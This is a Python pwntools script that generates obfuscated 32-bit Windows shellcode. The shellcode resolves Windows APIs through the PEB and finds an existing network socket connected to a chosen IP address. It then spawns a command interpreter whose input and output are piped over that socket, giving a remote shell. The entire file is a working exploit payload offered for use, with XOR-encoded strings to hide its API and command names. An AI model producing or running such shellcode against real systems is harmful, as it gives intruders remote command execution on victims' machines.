#!/usr/bin/env python3
from pwn import *
import sys, re

def str_to_stack(s):
	res = ''
	s = s.encode()
	s+=b'\x00'*(4 - (len(s)%4))
	sz = 0
	while len(s)>0:
		c = '0x'+xor(s[-4:][::-1], 0xff).hex()
		s = s[:-4]
		res+=f'''
mov eax, {c}
xor eax, 0xffffffff
push eax
'''
		sz+=4
	return res, sz




if __name__ == '__main__':
	ip = ''
	out = ''
	for i in range(len(sys.argv)-1):
		if sys.argv[i] == '-i' or sys.argv[i] == '--ip':
			ip = sys.argv[i+1]
		elif sys.argv[i] == '-o' or sys.argv[i] == '--output':
			out = sys.argv[i+1]
		elif sys.argv[i] == '-h' or sys.argv[i] == '--help':
			printf(f'{sys.argv[0]} -i/--ip IP -o/--output OUTFILE -h/--help')
			exit()

	if ip == '':
		print("Provide ip")
		exit()

	ip = ip.split('.')
	ip = int(hex(int(ip[3]))[2:]+hex(int(ip[2]))[2:]+hex(int(ip[1]))[2:]+hex(int(ip[0]))[2:], 16)
	ip = hex(ip ^ 0xffffffff)


	code = f'''
push ebp
mov ebp, esp
sub esp, 0x50
mov eax, [fs:0x30]; PEB addr
mov eax, [eax+0xc]; PEB_LDR_DATA addr
mov eax, [eax+0x14]
mov eax, [eax]
mov eax, [eax]
mov eax, [eax+0x10]; kernel32.dll base addr
mov [ebp-4], eax; var4=kerneldll base addr
mov eax, [eax+0x3c]
add eax, [ebp-4]; new header addr
mov eax, [eax+0x78]
add eax, [ebp-4]; export table addr
mov [ebp-8], eax; var8=export table
mov eax, [eax+0x20]
add eax, [ebp-4]; name pointer table
mov [ebp-12], eax; var12=name table
mov eax, [ebp-8]
mov eax, [eax+0x24]
add eax, [ebp-4]
mov [ebp-16], eax; var16= ordinal table
mov eax, [ebp-8]
mov eax, [eax+0x1c]
add eax, [ebp-4]
mov [ebp-20], eax; var20 = addr table


mov eax, 0xffff8c8c
xor eax, 0xffffffff
push eax
mov eax, 0x9a8d9b9b
xor eax, 0xffffffff
push eax
mov eax, 0xbe9c908d
xor eax, 0xffffffff
push eax
mov eax, 0xaf8b9ab8
xor eax, 0xffffffff
push eax
mov esi, esp; GetProcAddr

xor ecx, ecx
xor eax, eax
xor ebx, ebx
.lp1:
	mov edi, [ebp-12]
	mov edi, [edi+eax*4]
	add edi, [ebp-4]
	xor ecx, ecx
	.lp2:
		mov bl, [esi+ecx]
		mov bh, [edi+ecx]
		test bl, bl
		jz .found
		inc ecx
		cmp bl, bh
		je .lp2
		inc eax
		jmp .lp1

.found:
; eax = index of func
xor ecx, ecx
mov edi, [ebp-16]
mov cx, [edi+2*eax]
mov edi, [ebp-20]
mov eax, [edi+4*ecx]
add eax, [ebp-4]
mov [ebp-8], eax; var8 = GetProcAddr

add esp, 16; were allocated for string

; WUB WUB

; Get LoadLibrary addr

mov eax, 0xffffffff
xor eax, 0xffffffff
push eax

mov eax, 0xbe868d9e
xor eax, 0xffffffff
push eax

mov eax, 0x8d9d96b3
xor eax, 0xffffffff
push eax

mov eax, 0x9b9e90b3
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-12], eax; var12 = LoadLibraryA

add esp, 16

; Load Ws2_32.dll
mov eax, 0xffff9393
xor eax, 0xffffffff
push eax

mov eax, 0x9bd1cdcc
xor eax, 0xffffffff
push eax

mov eax, 0xa0cd8ca8
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-12]
call eax
mov [ebp-16], eax; var16 = Ws2_32.dll
add esp, 12

; get getpeername addr
mov eax, 0xff9a929e
xor eax, 0xffffffff
push eax

mov eax, 0x918d9a9a
xor eax, 0xffffffff
push eax

mov eax, 0x8f8b9a98
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-16]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-20], eax; var20 = getpeername
add esp, 12


xor eax, eax
push eax
push eax
push eax
push eax
mov [ebp-24], esp; var24=sockaddr
mov eax, 16
push eax
mov [ebp-28], esp; var28 = size 
mov dword ptr [ebp-32], 80; var32 = fd

.peerloop:
	mov eax, [ebp-28]
	push eax
	mov eax, [ebp-24]
	push eax
	mov eax, [ebp-32]
	push eax
	mov eax, [ebp-20]
	call eax
	test eax, eax
	jz .foundpeer
	mov eax, [ebp-32]
	inc eax
	mov [ebp-32], eax
	cmp eax, 100000
	jl .peerloop
add esp, 20
add esp, 0x30
pop ebp
xor eax, eax
ret

.foundpeer:
mov eax, [ebp-24]
add eax, 4
mov eax, [eax]; client ip address
mov ebx, {ip}; IP xored with 0xff
xor ebx, 0xffffffff
cmp eax, ebx
je .letsgooo
mov eax, [ebp-32]
inc eax
mov [ebp-32], eax
jmp .peerloop
.letsgooo:
mov eax, [ebp-32]
mov [ebp-20], eax; var20 = fd
add esp, 20
; get send func address

mov eax, 0xffffffff
xor eax, 0xffffffff
push eax

mov eax, 0x9b919a8c
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-16]
push eax
mov eax, [ebp-8]
call eax

mov [ebp-24], eax; var24 = send
add esp, 8

mov eax, 0xffffffff
xor eax, 0xffffffff
push eax

mov eax, 0x899c9a8d
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-16]
push eax
mov eax, [ebp-8]
call eax

mov [ebp-28], eax; var28 = recv
add esp, 8

mov eax, 0xffff9a8f
xor eax, 0xffffffff
push eax

mov eax, 0x96af9a8b
xor eax, 0xffffffff
push eax

mov eax, 0x9e9a8dbc
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-32], eax; var32 = CreatePipe 
add esp, 12

; create 4 fds
xor eax, eax
mov [ebp-36], eax
mov [ebp-40], eax
mov [ebp-44], eax
mov [ebp-48], eax

; Security_Attributes structure
push eax
push eax
push eax
mov [ebp-52], esp; var52 = sa
mov dword ptr [esp], 9; cb
mov byte ptr [esp+8], 1; InheritHandles

; stack + 12

; Creating Pipes

xor eax, eax
push eax
mov eax, [ebp-52]
push eax
lea eax, [ebp-40]; sock_out
push eax
lea eax, [ebp-44]; cmd_in
push eax


mov eax, [ebp-32]
call eax

xor eax, eax
push eax
mov eax, [ebp-52]
push eax
lea eax, [ebp-48]; sock_out
push eax
lea eax, [ebp-36]; cmd_in
push eax

mov eax, [ebp-32]
call eax


; STARTUPINFOA 17*4 bytes
xor eax, eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov [ebp-56], esp; var56 = si

mov dword ptr [esp], 0x44; cb
mov eax, [ebp-44]
mov dword ptr [esp+0x38], eax; stdIn
mov eax, [ebp-48]
mov dword ptr [esp+0x3c], eax; stdOut
mov dword ptr [esp+0x40], eax; stdErr

mov dword ptr [esp+44], 0x00000100; dwFlags useStdHandles

; stack + 17*4

; ProcessInformation 16 bytes

xor eax, eax
push eax
push eax
push eax
push eax
mov [ebp-60], esp; var60 = pi

; ; stack + 16

mov eax, 0xff9a879a
xor eax, 0xffffffff
push eax

mov eax, 0xd19b929c
xor eax, 0xffffffff
push eax

mov eax, 0xa3cdcc92
xor eax, 0xffffffff
push eax

mov eax, 0x9a8b8c86
xor eax, 0xffffffff
push eax

mov eax, 0xaca38c88
xor eax, 0xffffffff
push eax

mov eax, 0x909b9196
xor eax, 0xffffffff
push eax

mov eax, 0xa8a3c5bc
xor eax, 0xffffffff
push eax

mov [ebp-64], esp; var64 = cmdline
xor eax, eax
push eax
mov [ebp-68], esp; var68 = cmdargs, for some reason needed

; ;stack + 8*4

mov eax, 0xffffbe8c
xor eax, 0xffffffff
push eax

mov eax, 0x8c9a9c90
xor eax, 0xffffffff
push eax

mov eax, 0x8daf9a8b
xor eax, 0xffffffff
push eax

mov eax, 0x9e9a8dbc
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-72], eax; var72 = createProcess

add esp, 16



; Create Process

mov eax, [ebp-60]
push eax; pi
mov eax, [ebp-56]
push eax; si
xor eax, eax
push eax
push eax
push eax
inc eax
push eax; inherit handles
xor eax, eax
push eax
push eax
mov eax, [ebp-68]
push eax
mov eax, [ebp-64]
push eax

mov eax, [ebp-72]
call eax

; Close Handle
mov eax, 0xff9a939b
xor eax, 0xffffffff
push eax

mov eax, 0x919eb79a
xor eax, 0xffffffff
push eax

mov eax, 0x8c9093bc
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax

mov [ebp-32], eax; var32 = CloseHandle
add esp, 12

mov eax, [ebp-44]
push eax
mov eax, [ebp-32]
call eax

mov eax, [ebp-48]
push eax
mov eax, [ebp-32]
call eax

sub esp, 1028
mov [ebp-44], esp ; var44 = buf
xor eax, eax
inc eax
push eax
mov [ebp-48], esp ;var48 = iread


; ReadFile
mov eax, 0xffffffff
xor eax, 0xffffffff
push eax

mov eax, 0x9a9396b9
xor eax, 0xffffffff
push eax

mov eax, 0x9b9e9aad
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-52], eax; var52 = ReadFile
add esp, 12

; WriteFile

mov eax, 0xffffff9a
xor eax, 0xffffffff
push eax

mov eax, 0x9396b99a
xor eax, 0xffffffff
push eax

mov eax, 0x8b968da8
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-56], eax; var56 = WriteFile
add esp, 12

;PeekNamedPipe
mov eax, 0xffffff9a
xor eax, 0xffffffff
push eax

mov eax, 0x8f96af9b
xor eax, 0xffffffff
push eax

mov eax, 0x9a929eb1
xor eax, 0xffffffff
push eax

mov eax, 0x949a9aaf
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-60], eax; var60 = PeekNamedPipe
add esp, 16




.sock_loop:
	.read_loop:
	; call ReadFile
	xor eax, eax
	push eax; lpOverlapped
	mov eax, [ebp-48]
	push eax; &iread
	mov eax, 1024
	push eax; BytesToRead
	mov eax, [ebp-44]
	push eax; buf
	mov eax, [ebp-36]
	push eax
	mov eax, [ebp-52]
	call eax

	; send

	xor eax, eax
	push eax; lpOverlapped
	mov eax, [ebp-48]
	mov eax, [eax]
	push eax; BytesToWrite
	mov eax, [ebp-44]
	push eax; buf
	mov eax, [ebp-20]
	push eax; socket
	mov eax, [ebp-24]
	call eax
	
	; PeekPipe
	xor eax, eax
	push eax
	push eax
	mov eax, [ebp-48]
	push eax
	mov eax, 1024
	push eax
	mov eax, [ebp-44]
	push eax
	mov eax, [ebp-36]
	push eax
	mov eax, [ebp-60]
	call eax

	mov eax, [ebp-48]
	mov eax, [eax]
	cmp eax, 0

	jg .read_loop
	
	mov eax, [ebp-48]
	xor ecx, ecx
	mov dword ptr [eax], ecx
	.recv_loop:
	; recv command

	xor eax, eax
	push eax; lpOverlapped
	mov eax, 1024
	push eax; bufsize
	mov eax, [ebp-44]
	push eax; buf
	mov eax, [ebp-20]
	push eax; fd
	mov eax, [ebp-28]
	call eax
	cmp eax, 0
	je .recv_loop
	

	; Write to Pipe
	mov ecx, eax

	xor eax, eax
	push eax; lpOverlapped
	mov eax, [ebp-48]
	push eax; &iWritten
	mov eax, ecx
	push eax; BytesToWrite
	mov eax, [ebp-44]
	push eax; buf
	mov eax, [ebp-40]
	push eax; fd
	mov eax, [ebp-56]
	call eax
	mov eax, [ebp-48]
	mov eax, [eax]

	jmp .sock_loop

.exit:

add esp, 4
add esp, 1028
add esp, 12
add esp, 0x44
add esp, 16
add esp, 32

add esp, 0x50
pop ebp
ret
'''

	#print(code)
	context.update(arch='i686', bits=32)
	code = re.sub(';.*\n', '\n', code)
	sc = asm(code)
	if out == '':
		print(sc)
	else:
		open(out, 'wb').write(sc)
